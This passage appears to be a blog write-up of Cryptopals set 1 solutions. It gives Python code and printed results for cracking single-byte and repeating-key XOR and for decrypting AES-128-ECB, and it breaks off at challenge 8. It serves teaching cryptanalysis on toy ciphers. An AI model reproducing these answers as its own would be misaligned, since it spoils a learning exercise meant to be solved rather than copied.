<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_letter_ratio</span>(<span class="params">input_bytes</span>):</span></span><br><span class="line">    ascii_text_chars = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>)) + [<span class="number">32</span>] + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))</span><br><span class="line">    nb_letter = <span class="built_in">sum</span>([x <span class="keyword">in</span> ascii_text_chars <span class="keyword">for</span> x <span class="keyword">in</span> input_bytes])</span><br><span class="line">    <span class="keyword">return</span> nb_letter / <span class="built_in">len</span>(input_bytes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_probably_text</span>(<span class="params">input_bytes</span>):</span></span><br><span class="line">    ratio = get_letter_ratio(input_bytes = input_bytes)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> ratio &gt; <span class="number">0.8</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">hex_s = <span class="string">&#x27;1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736&#x27;</span></span><br><span class="line">bytes_s = unhexlify(hex_s) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    candidate_character = <span class="built_in">bytes</span>([i])</span><br><span class="line">    stream = candidate_character * <span class="built_in">len</span>(hex_s)</span><br><span class="line">    <span class="comment"># print(stream)</span></span><br><span class="line">    xor_res = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(bytes_s, stream)])</span><br><span class="line">    <span class="keyword">if</span> get_probably_text(input_bytes=xor_res) == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;message: &#x27;</span>,xor_res,<span class="string">&#x27;\tkey: &#x27;</span>,candidate_character)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&quot;Cooking MC&#x27;s like a pound of bacon&quot;</span></span><br><span class="line"><span class="comment"># b&#x27;x&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x04-Detect-single-character-XOR"><a href="#0x04-Detect-single-character-XOR" class="headerlink" title="0x04 Detect single-character XOR"></a>0x04 Detect single-character XOR</h3><p>One of the 60-character strings in this <a class="link"   href="https://cryptopals.com/static/challenge-data/4.txt" >file<i class="fas fa-external-link-alt"></i></a> has been encrypted by single-character XOR.</p>
<p>Find it.</p>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">ascii_text_chars = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>)) + [<span class="number">32</span>] + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_letter_ratio</span>(<span class="params">input_bytes</span>):</span></span><br><span class="line">    nb_letter = <span class="built_in">sum</span>([x <span class="keyword">in</span> ascii_text_chars <span class="keyword">for</span> x <span class="keyword">in</span> input_bytes])</span><br><span class="line">    <span class="keyword">return</span> nb_letter / <span class="built_in">len</span>(input_bytes)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_probably_text</span>(<span class="params">input_bytes</span>):</span></span><br><span class="line">    ratio = get_letter_ratio(input_bytes = input_bytes)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> ratio &gt; <span class="number">0.8</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_single_character_xor</span>(<span class="params">hex_s</span>):</span></span><br><span class="line">    bytes_s = unhexlify(hex_s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">        candidate_character = <span class="built_in">bytes</span>([i])</span><br><span class="line">        stream = candidate_character * <span class="built_in">len</span>(hex_s)</span><br><span class="line">        <span class="comment"># print(stream)</span></span><br><span class="line">        xor_res = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(bytes_s, stream)])</span><br><span class="line">        nb_letter = <span class="built_in">sum</span>([x <span class="keyword">in</span> ascii_text_chars <span class="keyword">for</span> x <span class="keyword">in</span> xor_res])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> get_probably_text(input_bytes=xor_res) == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;cipher: &#x27;</span>,bytes_s,<span class="string">&#x27;\tmessage: &#x27;</span>,xor_res,<span class="string">&#x27;\tkey: &#x27;</span>,candidate_character, <span class="string">&#x27;\tnb_letter:&#x27;</span>, nb_letter)</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">open</span>(<span class="string">&#x27;4.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">    crack_single_character_xor(s.strip())</span><br><span class="line"></span><br><span class="line"><span class="comment"># cipher:  b&#x27;&#123;ZB\x15A]TA\x15A]P\x15ETGAL\x15\\F\x15_@XE\\[R?&#x27;     message:  b&#x27;Now that the party is jumping\n&#x27;    key:  b&#x27;5&#x27;      nb_letter: 29</span></span><br></pre></td></tr></table></figure>

<h3 id="0x05-Implement-repeating-key-XOR"><a href="#0x05-Implement-repeating-key-XOR" class="headerlink" title="0x05 Implement repeating-key XOR"></a>0x05 Implement repeating-key XOR</h3><p>Here is the opening stanza of an important work of the English language:</p>
<blockquote>
<p>Burning ‘em, if you ain’t quick and nimble<br>I go crazy when I hear a cymbal</p>
</blockquote>
<p>Encrypt it, under the key “ICE”, using repeating-key XOR.</p>
<p>In repeating-key XOR, you’ll sequentially apply each byte of the key; the first byte of plaintext will be XOR’d against I, the next C, the next E, then I again for the 4th byte, and so on.</p>
<p>It should come out to:</p>
<blockquote>
<p>0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a26226324272765272<br>a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f</p>
</blockquote>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_repeating_key</span>(<span class="params">s</span>):</span></span><br><span class="line">    xor_res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">            xor_res.append((s[i] ^ <span class="built_in">ord</span>(<span class="string">&#x27;I&#x27;</span>)))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">            xor_res.append((s[i] ^ <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            xor_res.append((s[i] ^ <span class="built_in">ord</span>(<span class="string">&#x27;E&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> xor_res</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;Burning &#x27;em, if you ain&#x27;t quick and nimble\nI go crazy when I hear a cymbal&quot;</span></span><br><span class="line">b_s = <span class="built_in">bytes</span>(s.encode())</span><br><span class="line"></span><br><span class="line">xor_res = xor_repeating_key(b_s)</span><br><span class="line"><span class="built_in">print</span>(hexlify(<span class="built_in">bytes</span>(xor_res)))</span><br></pre></td></tr></table></figure>


<h3 id="0x06-Break-repeating-key-XOR"><a href="#0x06-Break-repeating-key-XOR" class="headerlink" title="0x06 Break repeating-key XOR"></a>0x06 Break repeating-key XOR</h3><p>There’s a <a class="link"   href="https://cryptopals.com/static/challenge-data/6.txt" >file<i class="fas fa-external-link-alt"></i></a> here. It’s been base64’d after being encrypted with repeating-key XOR.</p>
<p>Decrypt it.</p>
<p>Here’s how:</p>
<ol>
<li><p>Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40.</p>
</li>
<li><p>Write a function to compute the edit distance/Hamming distance between two strings. The Hamming distance is just the number of differing bits. The distance between:</p>
<blockquote>
<p>this is a test</p>
</blockquote>
</li>
</ol>
<p>and </p>
<blockquote>
<p>wokka wokka!!!</p>
</blockquote>
<p>is 37. Make sure your code agrees before you proceed.</p>
<ol start="3">
<li><p>For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them. Normalize this result by dividing by KEYSIZE.</p>
</li>
<li><p>The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values. Or take 4 KEYSIZE blocks instead of 2 and average the distances.</p>
</li>
<li><p>Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length.</p>
</li>
<li><p>Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on.</p>
</li>
<li><p>Solve each block as if it was single-character XOR. You already have code to do this.</p>
</li>
<li><p>For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block. Put them together and you have the key.</p>
</li>
</ol>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a,b)])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(<span class="built_in">bin</span>(byte).count(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(a,b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;6.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ciphertext= b64decode(f.read())</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score_vigenere_key_size</span>(<span class="params">candidate_key_size, ciphertext</span>):</span></span><br><span class="line">    slice_size = <span class="number">2</span> * candidate_key_size</span><br><span class="line">    </span><br><span class="line">    nb_mesurements = <span class="built_in">len</span>(ciphertext) // slice_size - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    score = <span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb_mesurements):</span><br><span class="line">        slice1 = <span class="built_in">slice</span>(i * slice_size , i * slice_size + candidate_key_size)</span><br><span class="line">        slice2 = <span class="built_in">slice</span>(i  * slice_size + candidate_key_size , i * slice_size + <span class="number">2</span> * candidate_key_size)</span><br><span class="line">        </span><br><span class="line">        score += hamming_distance(ciphertext[slice1], ciphertext[slice2])</span><br><span class="line">        </span><br><span class="line">    score /= candidate_key_size</span><br><span class="line">    score /= nb_mesurements</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_vigenere_key_length</span>(<span class="params">ciphertext, min_length = <span class="number">2</span>,max_length = <span class="number">30</span></span>):</span></span><br><span class="line">    key = <span class="keyword">lambda</span> x : score_vigenere_key_size(x, ciphertext)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">min</span>(<span class="built_in">range</span>(min_length,max_length),key = key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_single_byte_xor</span>(<span class="params">ciphertext</span>):</span></span><br><span class="line">    best = &#123;<span class="string">&quot;nb_letters&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">    ascii_text_chars = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>, <span class="number">122</span>)) + [<span class="number">32</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">8</span>):</span><br><span class="line">        candidate_key = i.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        candidate_message = bxor(ciphertext, candidate_key * <span class="built_in">len</span>(ciphertext))</span><br><span class="line">        nb_letters = <span class="built_in">sum</span>([x <span class="keyword">in</span> ascii_text_chars <span class="keyword">for</span> x <span class="keyword">in</span> candidate_message])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> best == <span class="literal">None</span> <span class="keyword">or</span> nb_letters &gt; best[<span class="string">&quot;nb_letters&quot;</span>]:</span><br><span class="line">            best = &#123;<span class="string">&quot;message&quot;</span> : candidate_message, <span class="string">&quot;nb_letters&quot;</span> : nb_letters, <span class="string">&quot;key&quot;</span>: candidate_key&#125;</span><br><span class="line">    <span class="keyword">return</span> best</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack_repeating_key_xor</span>(<span class="params">ciphertext</span>):</span></span><br><span class="line">    keysize = find_vigenere_key_length(ciphertext)</span><br><span class="line">    </span><br><span class="line">    key = <span class="built_in">bytes</span>()</span><br><span class="line">    </span><br><span class="line">    message_parts = <span class="built_in">list</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(keysize):</span><br><span class="line">        part = attack_single_byte_xor(<span class="built_in">bytes</span>(ciphertext[i::keysize]))</span><br><span class="line">        key += part[<span class="string">&quot;key&quot;</span>]    </span><br><span class="line">        message_parts.append(part[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    message = <span class="built_in">bytes</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">map</span>(<span class="built_in">len</span>,message_parts))):</span><br><span class="line">        message += <span class="built_in">bytes</span>(part[i] <span class="keyword">for</span> part <span class="keyword">in</span> message_parts <span class="keyword">if</span> <span class="built_in">len</span>(part) &gt;= i + <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;message&#x27;</span>:message, <span class="string">&#x27;key&#x27;</span>:key&#125;</span><br><span class="line"></span><br><span class="line">result = attack_repeating_key_xor(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, result[<span class="string">&quot;key&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result[<span class="string">&quot;message&quot;</span>].decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># key:  b&#x27;Terminator X: Bring the noise&#x27;</span></span><br><span class="line"><span class="comment"># message</span></span><br><span class="line"><span class="comment"># I&#x27;m back and I&#x27;m ringin&#x27; the bell </span></span><br><span class="line"><span class="comment"># A rockin&#x27; on the mike while the fly girls yell </span></span><br><span class="line"><span class="comment"># In ecstasy in the back of me </span></span><br><span class="line"><span class="comment"># Well that&#x27;s my DJ Deshay cuttin&#x27; all them Z&#x27;s </span></span><br><span class="line"><span class="comment"># Hittin&#x27; hard and the girlies goin&#x27; crazy </span></span><br><span class="line"><span class="comment"># Vanilla&#x27;s on the mike, man I&#x27;m not lazy. </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m lettin&#x27; my drug kick in </span></span><br><span class="line"><span class="comment"># It controls my mouth and I begin </span></span><br><span class="line"><span class="comment"># To just let it flow, let my concepts go </span></span><br><span class="line"><span class="comment"># My posse&#x27;s to the side yellin&#x27;, Go Vanilla Go! </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Smooth &#x27;cause that&#x27;s the way I will be </span></span><br><span class="line"><span class="comment"># And if you don&#x27;t give a damn, then </span></span><br><span class="line"><span class="comment"># Why you starin&#x27; at me </span></span><br><span class="line"><span class="comment"># So get off &#x27;cause I control the stage </span></span><br><span class="line"><span class="comment"># There&#x27;s no dissin&#x27; allowed </span></span><br><span class="line"><span class="comment"># I&#x27;m in my own phase </span></span><br><span class="line"><span class="comment"># The girlies sa y they love me and that is ok </span></span><br><span class="line"><span class="comment"># And I can dance better than any kid n&#x27; play </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2 -- Yea the one ya&#x27; wanna listen to </span></span><br><span class="line"><span class="comment"># It&#x27;s off my head so let the beat play through </span></span><br><span class="line"><span class="comment"># So I can funk it up and make it sound good </span></span><br><span class="line"><span class="comment"># 1-2-3 Yo -- Knock on some wood </span></span><br><span class="line"><span class="comment"># For good luck, I like my rhymes atrocious </span></span><br><span class="line"><span class="comment"># Supercalafragilisticexpialidocious </span></span><br><span class="line"><span class="comment"># I&#x27;m an effect and that you can bet </span></span><br><span class="line"><span class="comment"># I can take a fly girl and make her wet. </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m like Samson -- Samson to Delilah </span></span><br><span class="line"><span class="comment"># There&#x27;s no denyin&#x27;, You can try to hang </span></span><br><span class="line"><span class="comment"># But you&#x27;ll keep tryin&#x27; to get my style </span></span><br><span class="line"><span class="comment"># Over and over, practice makes perfect </span></span><br><span class="line"><span class="comment"># But not if you&#x27;re a loafer. </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You&#x27;ll get nowhere, no place, no time, no girls </span></span><br><span class="line"><span class="comment"># Soon -- Oh my God, homebody, you probably eat </span></span><br><span class="line"><span class="comment"># Spaghetti with a spoon! Come on and say it! </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># VIP. Vanilla Ice yep, yep, I&#x27;m comin&#x27; hard like a rhino </span></span><br><span class="line"><span class="comment"># Intoxicating so you stagger like a wino </span></span><br><span class="line"><span class="comment"># So punks stop trying and girl stop cryin&#x27; </span></span><br><span class="line"><span class="comment"># Vanilla Ice is sellin&#x27; and you people are buyin&#x27; </span></span><br><span class="line"><span class="comment"># &#x27;Cause why the freaks are jockin&#x27; like Crazy Glue </span></span><br><span class="line"><span class="comment"># Movin&#x27; and groovin&#x27; trying to sing along </span></span><br><span class="line"><span class="comment"># All through the ghetto groovin&#x27; this here song </span></span><br><span class="line"><span class="comment"># Now you&#x27;re amazed by the VIP posse. </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Steppin&#x27; so hard like a German Nazi </span></span><br><span class="line"><span class="comment"># Startled by the bases hittin&#x27; ground </span></span><br><span class="line"><span class="comment"># There&#x27;s no trippin&#x27; on mine, I&#x27;m just gettin&#x27; down </span></span><br><span class="line"><span class="comment"># Sparkamatic, I&#x27;m hangin&#x27; tight like a fanatic </span></span><br><span class="line"><span class="comment"># You trapped me once and I thought that </span></span><br><span class="line"><span class="comment"># You might have it </span></span><br><span class="line"><span class="comment"># So step down and lend me your ear </span></span><br><span class="line"><span class="comment"># &#x27;89 in my time! You, &#x27;90 is my year. </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You&#x27;re weakenin&#x27; fast, YO! and I can tell it </span></span><br><span class="line"><span class="comment"># Your body&#x27;s gettin&#x27; hot, so, so I can smell it </span></span><br><span class="line"><span class="comment"># So don&#x27;t be mad and don&#x27;t be sad </span></span><br><span class="line"><span class="comment"># &#x27;Cause the lyrics belong to ICE, You can call me Dad </span></span><br><span class="line"><span class="comment"># You&#x27;re pitchin&#x27; a fit, so step back and endure </span></span><br><span class="line"><span class="comment"># Let the witch doctor, Ice, do the dance to cure </span></span><br><span class="line"><span class="comment"># So come up close and don&#x27;t be square </span></span><br><span class="line"><span class="comment"># You wanna battle me -- Anytime, anywhere </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You thought that I was weak, Boy, you&#x27;re dead wrong </span></span><br><span class="line"><span class="comment"># So come on, everybody and sing this song </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Say -- Play that funky music Say, go white boy, go white boy go </span></span><br><span class="line"><span class="comment"># play that funky music Go white boy, go white boy, go </span></span><br><span class="line"><span class="comment"># Lay down and boogie and play that funky music till you die. </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Play that funky music Come on, Come on, let me hear </span></span><br><span class="line"><span class="comment"># Play that funky music white boy you say it, say it </span></span><br><span class="line"><span class="comment"># Play that funky music A little louder now </span></span><br><span class="line"><span class="comment"># Play that funky music, white boy Come on, Come on, Come on </span></span><br><span class="line"><span class="comment"># Play that funky music</span></span><br></pre></td></tr></table></figure>


<h3 id="0x07-AES-in-ECB-mode"><a href="#0x07-AES-in-ECB-mode" class="headerlink" title="0x07 AES in ECB mode"></a>0x07 AES in ECB mode</h3><p>The Base64-encoded content in this <a class="link"   href="https://cryptopals.com/static/challenge-data/7.txt" >file<i class="fas fa-external-link-alt"></i></a> has been encrypted via AES-128 in ECB mode under the key</p>
<blockquote>
<p>“YELLOW SUBMARINE”.</p>
</blockquote>
<p>(case-sensitive, without the quotes; exactly 16 characters; I like “YELLOW SUBMARINE” because it’s exactly 16 bytes long, and now you do too).</p>
<p>Decrypt it. You know the key, after all.</p>
<p>solution:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;7.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = b64decode(f.read())</span><br><span class="line">key = <span class="string">b&#x27;YELLOW SUBMARINE&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_aes_128_ecb</span>(<span class="params">ciphertext, key</span>):</span></span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend= backend)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    </span><br><span class="line">    message = decrypted_data</span><br><span class="line">    <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    decrypt_aes_128_ecb(</span><br><span class="line">        ciphertext = data,</span><br><span class="line">        key = key</span><br><span class="line">        ).decode()</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m back and I&#x27;m ringin&#x27; the bell </span></span><br><span class="line"><span class="comment"># A rockin&#x27; on the mike while the fly girls yell</span></span><br><span class="line"><span class="comment"># In ecstasy in the back of me</span></span><br><span class="line"><span class="comment"># Well that&#x27;s my DJ Deshay cuttin&#x27; all them Z&#x27;s</span></span><br><span class="line"><span class="comment"># Hittin&#x27; hard and the girlies goin&#x27; crazy</span></span><br><span class="line"><span class="comment"># Vanilla&#x27;s on the mike, man I&#x27;m not lazy.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m lettin&#x27; my drug kick in</span></span><br><span class="line"><span class="comment"># It controls my mouth and I begin</span></span><br><span class="line"><span class="comment"># To just let it flow, let my concepts go</span></span><br><span class="line"><span class="comment"># My posse&#x27;s to the side yellin&#x27;, Go Vanilla Go!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Smooth &#x27;cause that&#x27;s the way I will be</span></span><br><span class="line"><span class="comment"># And if you don&#x27;t give a damn, then</span></span><br><span class="line"><span class="comment"># Why you starin&#x27; at me</span></span><br><span class="line"><span class="comment"># So get off &#x27;cause I control the stage</span></span><br><span class="line"><span class="comment"># There&#x27;s no dissin&#x27; allowed</span></span><br><span class="line"><span class="comment"># I&#x27;m in my own phase</span></span><br><span class="line"><span class="comment"># The girlies sa y they love me and that is ok</span></span><br><span class="line"><span class="comment"># And I can dance better than any kid n&#x27; play</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 2 -- Yea the one ya&#x27; wanna listen to</span></span><br><span class="line"><span class="comment"># It&#x27;s off my head so let the beat play through</span></span><br><span class="line"><span class="comment"># So I can funk it up and make it sound good</span></span><br><span class="line"><span class="comment"># 1-2-3 Yo -- Knock on some wood</span></span><br><span class="line"><span class="comment"># For good luck, I like my rhymes atrocious</span></span><br><span class="line"><span class="comment"># Supercalafragilisticexpialidocious</span></span><br><span class="line"><span class="comment"># I&#x27;m an effect and that you can bet</span></span><br><span class="line"><span class="comment"># I can take a fly girl and make her wet.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I&#x27;m like Samson -- Samson to Delilah</span></span><br><span class="line"><span class="comment"># There&#x27;s no denyin&#x27;, You can try to hang</span></span><br><span class="line"><span class="comment"># But you&#x27;ll keep tryin&#x27; to get my style</span></span><br><span class="line"><span class="comment"># Over and over, practice makes perfect</span></span><br><span class="line"><span class="comment"># But not if you&#x27;re a loafer.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You&#x27;ll get nowhere, no place, no time, no girls</span></span><br><span class="line"><span class="comment"># Soon -- Oh my God, homebody, you probably eat</span></span><br><span class="line"><span class="comment"># Spaghetti with a spoon! Come on and say it!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># VIP. Vanilla Ice yep, yep, I&#x27;m comin&#x27; hard like a rhino</span></span><br><span class="line"><span class="comment"># Intoxicating so you stagger like a wino</span></span><br><span class="line"><span class="comment"># So punks stop trying and girl stop cryin&#x27;</span></span><br><span class="line"><span class="comment"># Vanilla Ice is sellin&#x27; and you people are buyin&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;Cause why the freaks are jockin&#x27; like Crazy Glue</span></span><br><span class="line"><span class="comment"># Movin&#x27; and groovin&#x27; trying to sing along</span></span><br><span class="line"><span class="comment"># All through the ghetto groovin&#x27; this here song</span></span><br><span class="line"><span class="comment"># Now you&#x27;re amazed by the VIP posse.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Steppin&#x27; so hard like a German Nazi</span></span><br><span class="line"><span class="comment"># Startled by the bases hittin&#x27; ground</span></span><br><span class="line"><span class="comment"># There&#x27;s no trippin&#x27; on mine, I&#x27;m just gettin&#x27; down</span></span><br><span class="line"><span class="comment"># Sparkamatic, I&#x27;m hangin&#x27; tight like a fanatic</span></span><br><span class="line"><span class="comment"># You trapped me once and I thought that</span></span><br><span class="line"><span class="comment"># You might have it</span></span><br><span class="line"><span class="comment"># So step down and lend me your ear</span></span><br><span class="line"><span class="comment"># &#x27;89 in my time! You, &#x27;90 is my year.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You&#x27;re weakenin&#x27; fast, YO! and I can tell it</span></span><br><span class="line"><span class="comment"># Your body&#x27;s gettin&#x27; hot, so, so I can smell it</span></span><br><span class="line"><span class="comment"># So don&#x27;t be mad and don&#x27;t be sad</span></span><br><span class="line"><span class="comment"># &#x27;Cause the lyrics belong to ICE, You can call me Dad</span></span><br><span class="line"><span class="comment"># You&#x27;re pitchin&#x27; a fit, so step back and endure</span></span><br><span class="line"><span class="comment"># Let the witch doctor, Ice, do the dance to cure</span></span><br><span class="line"><span class="comment"># So come up close and don&#x27;t be square</span></span><br><span class="line"><span class="comment"># You wanna battle me -- Anytime, anywhere</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You thought that I was weak, Boy, you&#x27;re dead wrong</span></span><br><span class="line"><span class="comment"># So come on, everybody and sing this song</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Say -- Play that funky music Say, go white boy, go white boy go</span></span><br><span class="line"><span class="comment"># play that funky music Go white boy, go white boy, go</span></span><br><span class="line"><span class="comment"># Lay down and boogie and play that funky music till you die.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Play that funky music Come on, Come on, let me hear</span></span><br><span class="line"><span class="comment"># Play that funky music white boy you say it, say it</span></span><br><span class="line"><span class="comment"># Play that funky music A little louder now</span></span><br><span class="line"><span class="comment"># Play that funky music, white boy Come on, Come on, Come on</span></span><br><span class="line"><span class="comment"># Play that funky music</span></span><br></pre></td></tr></table></figure>

<h3 id="0x08-Detect-AES-in-ECB-mode"><a href="#0x08-Detect-AES-in-ECB-mode" class="headerlink" title="0x08 Detect AES in ECB mode"></a>0x08 Detect AES in ECB mode</h3><p>In this <a class="link"   href="https://cryptopals.com/static/challenge-data/8.txt" >file<i class="fas fa-external-link-alt"></i></a> are a bunch of hex-encoded ciphertexts.</p>
<p>One of them has been encrypted with ECB.</p>
<p>Detect it.</p>
<p>Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext.</p>
<p>solution:</p>
